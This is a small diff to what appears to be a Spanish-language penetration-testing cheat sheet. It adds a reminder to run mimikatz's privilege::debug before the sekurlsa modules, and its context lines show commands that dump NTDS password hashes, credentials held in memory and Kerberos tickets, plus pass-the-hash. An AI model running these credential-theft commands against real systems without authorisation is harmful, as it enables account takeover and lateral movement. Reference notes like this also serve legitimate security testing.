@@ -44,6 +44,9 @@ NtdsAudit.exe ntds.dit --history-hashes -s SYSTEM -p hashes_history.txt
 mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > salida.txt
 
 # Modulos utiles
+# SIEMPRE ejecutar primero:
+privilege::debug            # elevar privilegios (obligatorio antes de sekurlsa/lsadump)
+
 sekurlsa::logonpasswords    # credenciales en memoria
 sekurlsa::tickets /export   # tickets Kerberos
 sekurlsa::pth               # pass-the-hash
